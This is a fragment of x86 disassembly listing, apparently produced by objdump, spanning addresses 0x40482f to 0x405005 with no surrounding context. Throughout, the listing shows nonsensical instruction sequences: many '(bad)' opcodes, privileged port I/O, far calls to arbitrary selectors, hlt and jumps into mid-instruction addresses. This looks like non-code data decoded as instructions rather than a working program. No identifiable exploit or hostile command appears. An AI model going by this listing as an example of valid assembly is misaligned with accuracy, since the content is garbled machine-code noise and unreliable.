  40482f:	add    ch,BYTE PTR [ebp*1+0x4a57d8d0]
  404836:	push   edx
  404837:	mov    DWORD PTR [ebx+ebx*4+0x7d],ecx
  40483b:	pushf  
  40483c:	sbb    DWORD PTR [ecx+0x56],ebx
  40483f:	inc    ebx
  404840:	(bad)  [esi+ecx*2+0x1c]
  404844:	dec    ebp
  404845:	in     eax,0x42
  404847:	inc    edx
  404848:	jge    0x4047e5
  40484a:	xor    al,BYTE PTR [edx-0x50fbbf5]
  404850:	dec    edx
  404851:	out    dx,eax
  404852:	sbb    al,0x3e
  404854:	pop    edx
  404855:	xor    eax,0x6b2ebc5a
  40485a:	cdq    
  40485b:	pop    eax
  40485c:	add    ecx,ecx
  40485e:	dec    edx
  40485f:	xchg   edx,eax
  404860:	xchg   edi,eax
  404861:	jecxz  0x4047e8
  404863:	fdiv   QWORD PTR [ecx]
  404865:	hlt    
  404866:	scas   al,BYTE PTR es:[edi]
  404867:	in     al,0x48
  404869:	add    eax,0xf4b06a69
  40486e:	fsubp  st(7),st
  404870:	push   edx
  404871:	or     bl,BYTE PTR [esi-0x59610e6a]
  404877:	call   0xb56e:0x476eedca
  40487e:	inc    ebx
  40487f:	jns    0x40484f
  404881:	in     eax,dx
  404882:	out    0xd7,al
  404884:	retf   
  404885:	xchg   BYTE PTR [ecx-0x5345b999],bh
  40488b:	xlat   BYTE PTR ds:[ebx]
  40488c:	cs iret 
  40488e:	add    eax,0x8794b49
  404893:	xor    al,0x1f
  404895:	(bad)  
  404896:	jle    0x4048c9
  404898:	mov    eax,ds:0xf82aacb3
  40489d:	push   ebx
  40489e:	jbe    0x4048ee
  4048a0:	cmp    cl,BYTE PTR [edi]
  4048a2:	cld    
  4048a3:	out    0x4b,eax
  4048a5:	dec    ebx
  4048a6:	mov    edx,0xdc5679a3
  4048ab:	lea    ecx,cs:[esi+0x6f]
  4048af:	rol    ebp,cl
  4048b1:	lock das 
  4048b3:	jmp    0x4048d3
  4048b5:	hlt    
  4048b6:	jl     0x4048c3
  4048b8:	ror    DWORD PTR [edx+0x30],cl
  4048bb:	arpl   WORD PTR [edi+0x3fa135b7],si
  4048c1:	push   ebx
  4048c2:	mov    BYTE PTR [eax+0x57cc253d],bl
  4048c8:	sbb    esp,DWORD PTR [ebx]
  4048ca:	cmp    esi,DWORD PTR [eax-0x43]
  4048cd:	mov    eax,0x9ade16aa
  4048d2:	add    eax,DWORD PTR [ebx*2-0x276f86f5]
  4048d9:	sbb    DWORD PTR [ecx+0x62],0xffffffb3
  4048dd:	add    dl,BYTE PTR [ecx-0x29e41b22]
  4048e3:	cmp    BYTE PTR [ecx],dh
  4048e5:	(bad)  
  4048e6:	sar    ch,1
  4048e8:	cwde   
  4048e9:	std    
  4048ea:	jle    0x4048db
  4048ec:	out    0x3e,al
  4048ee:	and    BYTE PTR [edx+0x6c],cl
  4048f1:	cld    
  4048f2:	ins    DWORD PTR es:[edi],dx
  4048f3:	push   0xffffffc0
  4048f5:	push   ebp
  4048f6:	gs jl  0x4048f9
  4048f9:	mov    bl,0x6f
  4048fb:	jmp    0x4048f7
  4048fd:	addr16 mov ecx,esi
  404900:	push   esi
  404901:	cmp    al,0x35
  404903:	mov    ebx,0x81ab7438
  404908:	pushf  
  404909:	xchg   ecx,eax
  40490a:	sbb    BYTE PTR [ebp-0xe1ed01c],ah
  404910:	pop    ds
  404911:	jg     0x40492c
  404913:	dec    ecx
  404914:	in     eax,dx
  404915:	ret    
  404916:	fistp  DWORD PTR [ebp-0x14cc71f4]
  40491c:	imul   edi,ecx,0x50
  40491f:	out    0x14,al
  404921:	loope  0x4048f1
  404923:	add    BYTE PTR [ebp+0x7beb863b],ch
  404929:	jl     0x404940
  40492b:	jae    0x404905
  40492d:	fist   DWORD PTR [edi]
  40492f:	push   0x31
  404931:	dec    esp
  404932:	and    eax,0x8bd2c3db
  404937:	enter  0xf9c9,0xce
  40493b:	jle    0x40497b
  40493d:	jae    0x404986
  40493f:	je     0x4049a6
  404941:	cli    
  404942:	stc    
  404943:	loope  0x4048e6
  404945:	pusha  
  404946:	popa   
  404947:	and    edx,DWORD PTR [edx-0x2b655d48]
  40494d:	(bad)  
  40494e:	mov    ds:0x1e0ddd44,eax
  404953:	mov    ecx,DWORD PTR ds:[ebp+ebx*8-0x79ebf4d1]
  40495b:	sbb    al,0xe0
  40495d:	mov    ds,WORD PTR fs:[edi-0x59fbde7d]
  404964:	aaa    
  404965:	cmp    eax,0xf8ed1500
  40496a:	das    
  40496b:	out    0x4f,al
  40496d:	sbb    DWORD PTR [edx+edx*4+0xc],ecx
  404971:	aam    0x1f
  404973:	add    ch,ah
  404975:	rcr    DWORD PTR [esi-0x64bad262],cl
  40497b:	fldcw  WORD PTR [eax-0x6f]
  40497e:	cld    
  40497f:	in     al,0xd7
  404981:	lds    ebp,FWORD PTR [esp-0x45]
  404985:	push   ecx
  404986:	ror    DWORD PTR [edx+0x1],cl
  404989:	pop    edx
  40498a:	retf   0x97ff
  40498d:	loopne 0x404981
  40498f:	mov    dl,0x73
  404991:	jno    0x404991
  404993:	sbb    DWORD PTR [ebx+0x77],0xffffff9a
  404997:	out    0x10,al
  404999:	mov    ecx,0x96b5e8dd
  40499e:	jge    0x404954
  4049a0:	arpl   WORD PTR [ecx+0x3],dx
  4049a3:	sub    eax,0xa172a321
  4049a8:	rcl    DWORD PTR [ebx+0x7f3b811e],0xbc
  4049af:	jbe    0x404999
  4049b1:	inc    edi
  4049b2:	xchg   ebx,eax
  4049b3:	inc    esi
  4049b4:	jle    0x4049d9
  4049b6:	mov    cl,0x8a
  4049b8:	aas    
  4049b9:	and    BYTE PTR [esi],bl
  4049bb:	push   cs
  4049bc:	jle    0x4049f7
  4049be:	repz int3 
  4049c0:	pop    ebx
  4049c1:	xor    al,0xe8
  4049c3:	ja     0x4049c2
  4049c5:	out    0x1b,al
  4049c7:	mov    al,ds:0x390fe1d1
  4049cc:	mov    dl,0x33
  4049ce:	sub    DWORD PTR [edx],eax
  4049d0:	call   0xd80d:0xe4c23180
  4049d7:	mov    bh,0x9d
  4049d9:	popf   
  4049da:	xor    ebx,DWORD PTR [ebx+0x1459b2c]
  4049e0:	dec    ecx
  4049e1:	fs push ecx
  4049e3:	pusha  
  4049e4:	xchg   edi,eax
  4049e5:	arpl   WORD PTR [edi+0x30236c76],dx
  4049eb:	adc    ah,BYTE PTR [ebp+0xe1ebbd7]
  4049f1:	xchg   esi,eax
  4049f2:	cmp    DWORD PTR [ecx-0x4f078a37],eax
  4049f8:	sub    BYTE PTR [edi-0x5d716ec0],bh
  4049fe:	in     al,dx
  4049ff:	fstp   DWORD PTR [esi]
  404a01:	rcl    BYTE PTR [ecx+0x6c],1
  404a04:	adc    DWORD PTR [eax],esp
  404a06:	push   ecx
  404a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a08:	xor    al,0xed
  404a0a:	(bad)  
  404a0b:	ret    0xcee0
  404a0e:	pop    esp
  404a0f:	add    BYTE PTR [ebp-0x3e],ch
  404a12:	out    0x48,eax
  404a14:	adc    BYTE PTR [ecx-0x3cef6853],dh
  404a1a:	shr    eax,1
  404a1c:	inc    edi
  404a1d:	ins    DWORD PTR es:[edi],dx
  404a1e:	jl     0x4049f5
  404a20:	sub    eax,0x6765879d
  404a25:	nop
  404a26:	leave  
  404a27:	and    ch,bl
  404a29:	loopne 0x4049bf
  404a2b:	pusha  
  404a2c:	mov    eax,0x2c13ebf9
  404a31:	pop    esi
  404a32:	mov    ah,0xe5
  404a34:	ficomp WORD PTR [eax-0x145968b2]
  404a3a:	or     eax,0xf417d69d
  404a3f:	add    BYTE PTR [edi],0xa4
  404a42:	nop
  404a43:	jb     0x404a6e
  404a45:	js     0x404a03
  404a47:	inc    esi
  404a48:	in     al,0x17
  404a4a:	add    DWORD PTR [ecx-0x52],ebx
  404a4d:	pop    edi
  404a4e:	hlt    
  404a4f:	popa   
  404a50:	push   ebp
  404a51:	fild   QWORD PTR [edi+0x1120f0eb]
  404a57:	div    DWORD PTR [edi+ebp*2]
  404a5a:	inc    ecx
  404a5b:	xchg   bh,bl
  404a5d:	inc    ch
  404a5f:	out    dx,eax
  404a60:	ins    BYTE PTR es:[edi],dx
  404a61:	sbb    eax,0xbf2e604a
  404a66:	cmp    DWORD PTR [edx],0xffffff95
  404a69:	aad    0xcf
  404a6b:	cli    
  404a6c:	jecxz  0x404ab7
  404a6e:	mov    bl,0x7f
  404a70:	ds pop ecx
  404a72:	out    dx,al
  404a73:	xor    esp,esi
  404a75:	dec    esi
  404a76:	xchg   ebp,eax
  404a77:	xchg   esp,esi
  404a79:	stc    
  404a7a:	gs call 0xab81:0xf6cd2037
  404a82:	neg    BYTE PTR [ebp+0x585cd623]
  404a88:	mov    edi,0x8a72cbf6
  404a8d:	fdiv   DWORD PTR [edi]
  404a8f:	jbe    0x404a64
  404a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a92:	sbb    ebp,ebp
  404a94:	push   ebp
  404a95:	out    0x72,al
  404a97:	mov    WORD PTR [ebx],es
  404a99:	sub    esp,DWORD PTR gs:[edx]
  404a9c:	inc    ebp
  404a9d:	test   al,0x3a
  404a9f:	cmp    dh,BYTE PTR [eax-0x2f98440c]
  404aa5:	sti    
  404aa6:	mov    edi,0x1c6f5199
  404aab:	and    DWORD PTR [eax+0x1a9a4c29],edi
  404ab1:	jnp    0x404ab4
  404ab3:	fwait
  404ab4:	or     dh,ch
  404ab6:	sahf   
  404ab7:	or     bh,BYTE PTR [edi+0xf]
  404aba:	mov    ah,0x17
  404abc:	(bad)  
  404abd:	mov    al,0xfd
  404abf:	mov    ah,0x2
  404ac1:	hlt    
  404ac2:	popf   
  404ac3:	inc    ebp
  404ac4:	adc    BYTE PTR [eax],bl
  404ac6:	mov    esi,0xf0601c99
  404acb:	add    BYTE PTR [ebp-0x59],bh
  404ace:	loop   0x404b0f
  404ad0:	arpl   ax,dx
  404ad2:	loopne 0x404adc
  404ad4:	xor    eax,0x1358e81c
  404ad9:	jno    0x404a6e
  404adb:	ret    
  404adc:	(bad)  
  404add:	mov    edx,0xa1eb3c6d
  404ae2:	je     0x404abc
  404ae4:	pop    esp
  404ae5:	jmp    0x2a82:0x41895b78
  404aec:	jbe    0x404b61
  404aee:	jg     0x404b57
  404af0:	stc    
  404af1:	je     0x404b59
  404af3:	fwait
  404af4:	cwde   
  404af5:	mov    ecx,0x7a454897
  404afa:	dec    ebx
  404afb:	lea    eax,[edi+0x3626b29e]
  404b01:	mov    dh,0x28
  404b03:	fmul   DWORD PTR [ecx]
  404b05:	hlt    
  404b06:	loope  0x404afe
  404b08:	sbb    dh,BYTE PTR [ecx+0x64]
  404b0b:	xchg   DWORD PTR [ecx-0x6e6d2cc4],edi
  404b11:	cmp    eax,0xc22ee143
  404b16:	and    ah,bl
  404b18:	push   ecx
  404b19:	inc    ecx
  404b1a:	call   0x5614b3c3
  404b1f:	lds    edi,FWORD PTR [ebx]
  404b21:	retf   
  404b22:	mov    BYTE PTR [ebp+0x59],dl
  404b25:	jp     0x404b61
  404b27:	mov    edi,0xd1e3c6b
  404b2c:	sahf   
  404b2d:	ret    
  404b2e:	xchg   esi,eax
  404b2f:	jne    0x404b4e
  404b31:	jmp    0xdc977d0d
  404b36:	das    
  404b37:	enter  0x66e6,0x87
  404b3b:	ja     0x404ad6
  404b3d:	xor    esp,0xfffffffc
  404b40:	jecxz  0x404b8c
  404b42:	int3   
  404b43:	add    ebx,DWORD PTR fs:[edx-0x16a7cc12]
  404b4a:	add    ebx,DWORD PTR [ebx]
  404b4c:	(bad)  
  404b4d:	push   eax
  404b4e:	mov    esp,0xc3a5d32
  404b53:	sub    al,0xe8
  404b55:	inc    edi
  404b56:	mov    ch,0xcb
  404b58:	bound  ebx,QWORD PTR [ebx-0x16]
  404b5b:	lea    ecx,[esi-0x53d35031]
  404b61:	jle    0x404aee
  404b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b64:	sbb    eax,0x9a6c9d96
  404b69:	inc    edx
  404b6a:	inc    edi
  404b6b:	xchg   ecx,eax
  404b6c:	inc    eax
  404b6d:	inc    esi
  404b6e:	push   ebx
  404b6f:	ror    BYTE PTR [esi],0x95
  404b72:	jp     0x404b4a
  404b74:	pop    esp
  404b75:	mov    edi,0xea87ef76
  404b7a:	inc    ebx
  404b7b:	sbb    al,0x6e
  404b7d:	adc    bl,0x4f
  404b80:	imul   ecx,DWORD PTR [ecx+ebx*2+0x5bc6ca7c],0xd2032b0
  404b8b:	xor    eax,0x40365fdb
  404b90:	popa   
  404b91:	or     cl,BYTE PTR ds:0x2aaf33ae
  404b97:	gs add cl,bh
  404b9a:	mov    ds:0x8df69bc,eax
  404b9f:	leave  
  404ba0:	outs   dx,BYTE PTR ds:[esi]
  404ba1:	push   cs
  404ba2:	fisttp WORD PTR ds:[ecx]
  404ba5:	daa    
  404ba6:	test   bl,ch
  404ba8:	fs sub ecx,edi
  404bab:	in     al,dx
  404bac:	or     BYTE PTR [edx+0x17f03e8e],0xcf
  404bb3:	scas   al,BYTE PTR es:[edi]
  404bb4:	adc    ebp,DWORD PTR [ecx+esi*8]
  404bb7:	retf   0x298d
  404bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bbb:	xor    eax,0xcae08bd5
  404bc0:	sar    DWORD PTR [eax-0x7a154743],0x91
  404bc7:	fld    TBYTE PTR [esi]
  404bc9:	mov    ds:0x2f183800,al
  404bce:	(bad)  [esi-0x6ad64439]
  404bd4:	arpl   bx,cx
  404bd6:	pushf  
  404bd7:	xchg   ebx,eax
  404bd8:	mov    dl,0xb6
  404bda:	lahf   
  404bdb:	push   esi
  404bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bdd:	gs shl ebx,0x97
  404be1:	ds xchg edx,eax
  404be3:	jp     0x404bb6
  404be5:	mov    ds:0x50a13854,al
  404bea:	push   0xda28a651
  404bef:	nop
  404bf0:	(bad)  
  404bf1:	adc    al,0x47
  404bf3:	ds mov bh,0xfa
  404bf6:	inc    esi
  404bf7:	inc    ebp
  404bf8:	call   0x85bc:0xe56f81ad
  404bff:	xchg   edx,eax
  404c00:	imul   esp,DWORD PTR [eax-0x7ee715fa],0x3245397
  404c0a:	xchg   BYTE PTR [edi-0x1e654ed4],cl
  404c10:	lds    esi,FWORD PTR [edx-0x4a4f1075]
  404c16:	push   esp
  404c17:	inc    ebp
  404c18:	pop    es
  404c19:	sub    BYTE PTR [esi+0x4a3e645d],0x34
  404c20:	mov    esi,0x3e0f8575
  404c25:	mov    ah,BYTE PTR [ebx+0x7be1b872]
  404c2b:	test   BYTE PTR [ecx-0x4a],al
  404c2e:	xchg   ebp,eax
  404c2f:	pop    ds
  404c30:	pop    esi
  404c31:	jo     0x404c87
  404c33:	mov    fs,WORD PTR [ecx-0x30]
  404c36:	sbb    al,0xe
  404c38:	arpl   WORD PTR [ecx+0x6c],dx
  404c3b:	(bad)  
  404c3c:	popf   
  404c3d:	loope  0x404c86
  404c3f:	xchg   edx,eax
  404c40:	push   ebp
  404c41:	jmp    0x404cc2
  404c43:	mov    dl,0x51
  404c45:	addr16 mov ds:0xed8,al
  404c49:	cmp    BYTE PTR [ecx],bh
  404c4b:	repnz mov WORD PTR [edi+0x59],ss
  404c4f:	push   0xb0a094c1
  404c54:	mov    eax,ds:0x21a82484
  404c59:	ror    BYTE PTR [esp+esi*1-0x1560e7ab],0x1b
  404c61:	test   BYTE PTR es:[edx],bh
  404c64:	jae    0x404c35
  404c66:	jp     0x404ca2
  404c68:	ret    
  404c69:	mov    edi,0xe96cd01c
  404c6e:	(bad)  
  404c6f:	jge    0x404cf0
  404c71:	fistp  DWORD PTR [ebx-0x50]
  404c74:	xor    ebp,DWORD PTR [ecx+ecx*4]
  404c77:	pop    DWORD PTR [esi+0x1ea3e59b]
  404c7d:	cdq    
  404c7e:	in     al,dx
  404c7f:	imul   eax,DWORD PTR [eax-0x3d7d8fe2],0x6d93f5b
  404c89:	jnp    0x404c72
  404c8b:	mov    DWORD PTR [esi+ebp*8+0x58c9dcc8],ebp
  404c92:	jno    0x404c46
  404c94:	ret    
  404c95:	ds push esp
  404c97:	fsubr  QWORD PTR [ebp-0x3e04d88b]
  404c9d:	lahf   
  404c9e:	sbb    al,BYTE PTR [edi+0x6f]
  404ca1:	push   edi
  404ca2:	addr16 and al,0x59
  404ca5:	push   0x75
  404ca7:	ret    
  404ca8:	hlt    
  404ca9:	popf   
  404caa:	rcr    DWORD PTR [edx-0x65a0a25d],cl
  404cb0:	(bad)  
  404cb1:	stos   BYTE PTR es:[edi],al
  404cb2:	jg     0x404ccc
  404cb4:	adc    al,0x63
  404cb6:	mov    esi,0x52a6b3de
  404cbb:	into   
  404cbc:	test   DWORD PTR gs:[edi+0x20],ecx
  404cc0:	jbe    0x404ca3
  404cc2:	pop    es
  404cc3:	loopne 0x404cc8
  404cc5:	sbb    dh,BYTE PTR [ebx+edi*2]
  404cc8:	ret    0x3ee0
  404ccb:	outs   dx,DWORD PTR ds:[esi]
  404ccc:	xchg   DWORD PTR [ecx+0x1048b2de],ebp
  404cd2:	mov    edi,0x4aa07a81
  404cd7:	add    al,0xdf
  404cd9:	shr    DWORD PTR [ebp-0x42],1
  404cdc:	call   0x41c4152a
  404ce1:	iret   
  404ce2:	out    0xb0,al
  404ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce5:	fadd   DWORD PTR [eax-0x68]
  404ce8:	js     0x404d2e
  404cea:	mov    al,0xa
  404cec:	jge    0x404c94
  404cee:	aaa    
  404cef:	shr    ecx,0x48
  404cf2:	nop
  404cf3:	gs out dx,al
  404cf5:	arpl   ax,sp
  404cf7:	fs cli 
  404cf9:	fsub   QWORD PTR [esi]
  404cfb:	ds pop esi
  404cfd:	inc    esp
  404cfe:	lahf   
  404cff:	mov    al,ds:0xe48037f6
  404d04:	rcl    DWORD PTR [ecx+ebp*2],0x6
  404d08:	mov    esi,DWORD PTR [edx+0x2]
  404d0b:	sub    eax,0xcb57e7ed
  404d10:	inc    ecx
  404d11:	stc    
  404d12:	cmp    edx,DWORD PTR [esi]
  404d14:	push   0x75
  404d16:	ret    0x8158
  404d19:	xlat   BYTE PTR ds:[ebx]
  404d1a:	scas   eax,DWORD PTR es:[edi]
  404d1b:	sbb    al,0x5b
  404d1d:	add    DWORD PTR [esp+eax*1-0x59],eax
  404d21:	mov    eax,0x89e9eb02
  404d26:	mov    ds:0x42ff98df,al
  404d2b:	jge    0x404d34
  404d2d:	jnp    0x404d33
  404d2f:	jmp    0x2260:0x735bca2f
  404d36:	sbb    esp,edx
  404d38:	ins    BYTE PTR es:[edi],dx
  404d39:	test   BYTE PTR ds:0x7f8de0ab,ah
  404d3f:	mov    ch,0xd6
  404d41:	int3   
  404d42:	and    eax,0x643890ca
  404d47:	mov    ds:0x601a4e50,eax
  404d4c:	retf   
  404d4d:	sub    eax,0x5ccdc48c
  404d52:	mov    eax,ds:0x64405eee
  404d57:	inc    esp
  404d58:	adc    edx,eax
  404d5a:	(bad)  
  404d5b:	mul    BYTE PTR [esi+0x34]
  404d5e:	sar    BYTE PTR [edx-0x21],cl
  404d61:	out    0x5e,eax
  404d63:	and    DWORD PTR [esi],edi
  404d65:	sub    eax,DWORD PTR [esi-0x641b6f9a]
  404d6b:	mov    edi,DWORD PTR [edi]
  404d6d:	add    BYTE PTR [edx-0x5a],bl
  404d70:	loope  0x404d9d
  404d72:	lea    ecx,[eax]
  404d74:	setnp  BYTE PTR [edi]
  404d77:	test   DWORD PTR [ebp+0x79eeb41c],eax
  404d7d:	mov    esp,0x6ad092e1
  404d82:	cmp    BYTE PTR [eax+0x1c42a4fe],ah
  404d88:	aas    
  404d89:	pop    ss
  404d8a:	in     eax,dx
  404d8b:	pushf  
  404d8c:	jo     0x404dcf
  404d8e:	push   0x85a22b1f
  404d93:	outs   dx,BYTE PTR ds:[esi]
  404d94:	add    edx,eax
  404d96:	fsub   DWORD PTR [eax]
  404d98:	ja     0x404d98
  404d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d9b:	pushf  
  404d9c:	xchg   edx,eax
  404d9d:	popa   
  404d9e:	sar    DWORD PTR [edx-0x46],cl
  404da1:	sub    al,0x15
  404da3:	and    DWORD PTR cs:[edi-0x150d6340],0xffffffa3
  404dab:	push   eax
  404dac:	inc    DWORD PTR [eax]
  404dae:	push   es
  404daf:	mov    eax,0xc2d93564
  404db4:	int3   
  404db5:	jns    0x404d57
  404db7:	daa    
  404db8:	adc    eax,0xa5c8aed4
  404dbd:	mov    dh,0x40
  404dbf:	push   ebp
  404dc0:	call   DWORD PTR [edx+0xcf27ab1]
  404dc6:	xchg   DWORD PTR [edx-0x55],esp
  404dc9:	out    dx,eax
  404dca:	and    ebx,DWORD PTR [esi+0x69]
  404dcd:	and    eax,0xa77f111c
  404dd2:	test   al,bh
  404dd4:	shl    BYTE PTR ds:0xb6965534,0x40
  404ddb:	pop    edx
  404ddc:	mov    al,BYTE PTR [ebx+eax*8]
  404ddf:	jg     0x404dbf
  404de1:	xchg   BYTE PTR ds:0x99718a0d,al
  404de7:	mov    bh,0x68
  404de9:	retf   
  404dea:	fld    QWORD PTR [edx]
  404dec:	outs   dx,DWORD PTR ds:[esi]
  404ded:	add    eax,0xb0842768
  404df2:	call   0x7b39:0x34cf5b83
  404df9:	mov    ch,0x58
  404dfb:	ss add al,0xdc
  404dfe:	rcl    BYTE PTR [di+0x6904],cl
  404e03:	hlt    
  404e04:	repnz std 
  404e06:	push   esp
  404e07:	push   ds
  404e08:	(bad)  
  404e09:	mov    eax,0xeda4d04
  404e0e:	jp     0x404dc7
  404e10:	scas   al,BYTE PTR es:[edi]
  404e11:	nop
  404e12:	mov    bh,0x41
  404e14:	adc    edi,DWORD PTR [edx]
  404e16:	outs   dx,DWORD PTR ds:[esi]
  404e17:	xchg   esi,eax
  404e18:	mov    bh,0x4f
  404e1a:	jmp    FWORD PTR [ecx-0x57]
  404e1d:	push   cs
  404e1e:	add    al,0xa7
  404e20:	(bad)  
  404e22:	xchg   ebx,esi
  404e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e25:	jae    0x404e56
  404e27:	daa    
  404e28:	out    dx,eax
  404e29:	test   al,0x36
  404e2b:	mov    al,dl
  404e2d:	push   ecx
  404e2e:	cs jno 0x404e9c
  404e31:	retf   0xe5c
  404e34:	sbb    al,0x4a
  404e36:	scas   al,BYTE PTR es:[edi]
  404e37:	jnp    0x404e96
  404e39:	jl     0x404e85
  404e3b:	add    BYTE PTR [esi-0x79],cl
  404e3e:	cmp    DWORD PTR [esi+edi*1-0x2],eax
  404e42:	jmp    0xd2b009e0
  404e47:	hlt    
  404e48:	and    DWORD PTR [ecx-0x40],0xffffffbe
  404e4c:	test   al,0x5b
  404e4e:	pop    eax
  404e4f:	sub    BYTE PTR [edx],ch
  404e51:	retf   0xe663
  404e54:	aad    0xcd
  404e56:	mov    dh,0xc2
  404e58:	imul   ecx,DWORD PTR [ebp+0x7fb0b1c4],0xffffffca
  404e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e60:	pusha  
  404e61:	clc    
  404e62:	loop   0x404e06
  404e64:	bound  eax,QWORD PTR [edx+0x23]
  404e67:	push   eax
  404e68:	xor    ebx,ebx
  404e6a:	mov    edi,0xbd6cc09f
  404e6f:	test   eax,0x83718904
  404e74:	mov    ds,WORD PTR [esi]
  404e76:	iret   
  404e77:	into   
  404e78:	(bad)  
  404e79:	xlat   BYTE PTR ds:[ebx]
  404e7a:	pop    esi
  404e7b:	mov    BYTE PTR [esi],bh
  404e7d:	or     dl,cl
  404e7f:	data16 cs sti 
  404e82:	cmp    al,0x66
  404e84:	arpl   bp,bp
  404e86:	push   ebp
  404e87:	lahf   
  404e88:	xor    eax,0x289f9230
  404e8d:	adc    eax,ebp
  404e8f:	sub    BYTE PTR [edi+0x3d25fc31],ah
  404e95:	scas   eax,DWORD PTR es:[edi]
  404e96:	push   edx
  404e97:	cld    
  404e98:	test   BYTE PTR [ebp-0x584a5707],ah
  404e9e:	jmp    0xb943bc6a
  404ea3:	sbb    BYTE PTR [ebx-0x6a],al
  404ea6:	outs   dx,BYTE PTR ds:[esi]
  404ea7:	ret    0x5337
  404eaa:	les    eax,FWORD PTR [ebx+0x12e0e8c3]
  404eb0:	cmp    DWORD PTR [eax-0x1296a840],ecx
  404eb6:	loopne 0x404eda
  404eb8:	daa    
  404eb9:	popa   
  404eba:	xchg   esp,eax
  404ebb:	pop    ecx
  404ebc:	add    BYTE PTR [ebx+0x49188bfc],bl
  404ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec3:	dec    eax
  404ec4:	test   BYTE PTR [ebx-0x11212abe],ah
  404eca:	rcr    BYTE PTR [edx],0x3
  404ecd:	sbb    al,0x55
  404ecf:	push   eax
  404ed0:	pop    edi
  404ed1:	lock inc ebp
  404ed3:	pop    edx
  404ed4:	cdq    
  404ed5:	outs   dx,DWORD PTR ds:[esi]
  404ed6:	(bad)  
  404ed7:	mov    bl,0xd0
  404ed9:	test   al,0x85
  404edb:	and    dh,dh
  404edd:	pop    ebx
  404ede:	cs retf 
  404ee0:	xor    DWORD PTR [esi*1-0x4e7e7d0],ecx
  404ee7:	fidiv  DWORD PTR [edi+0x25]
  404eea:	sbb    BYTE PTR [edx+0x39814e6f],ch
  404ef0:	les    ebp,FWORD PTR [edi-0x60]
  404ef3:	adc    eax,0x48767002
  404ef8:	dec    edi
  404ef9:	cs stos BYTE PTR es:[edi],al
  404efb:	cwde   
  404efc:	inc    esp
  404efd:	in     eax,0x13
  404eff:	cmp    ebp,DWORD PTR [edx+0x3d0197a1]
  404f05:	jmp    0x404f4b
  404f07:	xor    DWORD PTR [edx-0x5d],esi
  404f0a:	dec    eax
  404f0b:	push   edi
  404f0c:	shl    BYTE PTR [eax],1
  404f0e:	jno    0x404ef6
  404f10:	pop    ss
  404f11:	clc    
  404f12:	ret    0x694e
  404f15:	mov    esp,0xa987b3ad
  404f1a:	jmp    0x404f22
  404f1c:	mov    bl,0x8e
  404f1e:	push   esi
  404f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f20:	or     DWORD PTR [eax-0x5e],esi
  404f23:	or     BYTE PTR [edx+0x5c2b799a],ah
  404f29:	out    0x22,al
  404f2b:	sbb    eax,0x955b846e
  404f30:	lods   eax,DWORD PTR ds:[esi]
  404f31:	je     0x404f89
  404f33:	cmp    edx,DWORD PTR [ebp-0x2bb4512a]
  404f39:	(bad)  
  404f3a:	out    dx,eax
  404f3b:	jle    0x404f41
  404f3d:	and    DWORD PTR [esp+esi*4-0x74],esp
  404f41:	call   0x39f5:0x977a9002
  404f48:	int    0x35
  404f4a:	mul    BYTE PTR [eax+0x28]
  404f4d:	imul   esi,DWORD PTR [ebx],0xffffffaf
  404f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f51:	rcr    DWORD PTR [edi+edx*8+0x35312533],1
  404f58:	fst    QWORD PTR [esi+ebx*2+0x737edb0]
  404f5f:	retf   0xde10
  404f62:	rcl    BYTE PTR [eax-0x59],cl
  404f65:	inc    ecx
  404f66:	mov    dh,0xb7
  404f68:	dec    esp
  404f69:	and    DWORD PTR [edi+0x63],edi
  404f6c:	mov    dl,0x47
  404f6e:	pop    esp
  404f6f:	pop    esi
  404f70:	inc    ebx
  404f71:	sub    al,0x10
  404f73:	retf   0x534
  404f76:	icebp  
  404f77:	push   0x928fc5ad
  404f7c:	retf   0xd8cf
  404f7f:	mov    edx,0xac316fb5
  404f84:	adc    BYTE PTR [esi+ecx*2],dl
  404f87:	std    
  404f88:	test   al,0x39
  404f8a:	sub    bh,BYTE PTR [ebp+0x9839365]
  404f90:	pop    eax
  404f91:	call   0xe0d15476
  404f96:	call   0xe2ae:0x877b3166
  404f9d:	inc    ecx
  404f9e:	xchg   esp,eax
  404f9f:	sbb    DWORD PTR [esi+esi*8+0x3241488a],0x4c
  404fa7:	push   edi
  404fa8:	mov    DWORD PTR ds:0xe500afae,eax
  404fae:	mov    eax,0x13e02701
  404fb3:	scas   al,BYTE PTR es:[edi]
  404fb4:	out    dx,eax
  404fb5:	mov    bh,0xbc
  404fb7:	mov    BYTE PTR [ecx+0x3943f0b1],cl
  404fbd:	mov    bl,0x90
  404fbf:	pop    ebp
  404fc0:	fsubp  st(7),st
  404fc3:	pop    edx
  404fc4:	mov    ds:0x389041c5,eax
  404fc9:	cmp    esp,DWORD PTR [esi-0xc]
  404fcc:	sub    esi,DWORD PTR [ebp+0x3c]
  404fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fd0:	repz adc ebx,edi
  404fd3:	lds    ebx,FWORD PTR [eax-0x6f]
  404fd6:	stos   BYTE PTR es:[edi],al
  404fd7:	adc    ebx,DWORD PTR [esi+0x69]
  404fda:	mov    ?,WORD PTR [eax-0x25bf0665]
  404fe0:	xlat   BYTE PTR ds:[ebx]
  404fe1:	xor    eax,0x1547df0b
  404fe6:	rol    DWORD PTR [edx+0x41],1
  404fe9:	lock mov bl,0xe1
  404fec:	lock fidivr DWORD PTR [edx-0x2f]
  404ff0:	push   eax
  404ff1:	inc    ebx
  404ff2:	push   esi
  404ff3:	icebp  
  404ff4:	xor    WORD PTR [edx+ecx*1+0xe],si
  404ff9:	leave  
  404ffa:	pop    es
  404ffb:	push   esp
  404ffc:	xchg   ebp,eax
  404ffd:	sbb    al,0xf9
  404fff:	pop    esi
  405000:	dec    ebp
  405001:	arpl   WORD PTR cs:[edx-0x7],dx
  405005:	stc    
